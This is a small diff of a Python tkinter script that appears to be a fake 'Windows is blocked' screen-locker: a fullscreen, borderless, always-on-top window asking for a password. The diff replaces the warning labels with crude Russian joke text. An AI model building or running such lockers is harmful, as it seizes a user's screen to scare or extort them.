@@ -97,11 +97,12 @@ root.attributes("-topmost", 1)
 root.geometry(f"{X}x{Y}+{virtual_x}+{virtual_y}")  # Размещаем окно на всей доступной области
 root.overrideredirect(1)  # Убираем рамки окна
 
-Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
-Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
+Label(text="Ну блять винда типо да!", fg="red", bg=bg, font=font).pack()
+Label(text="\n\n\n\nНу тип пароль", fg="white", bg=bg, font=font).pack()
 
 password = Entry(font=font)
 password.pack()
 password.bind("<Return>", CheckPassword)
 
 root.mainloop()
+
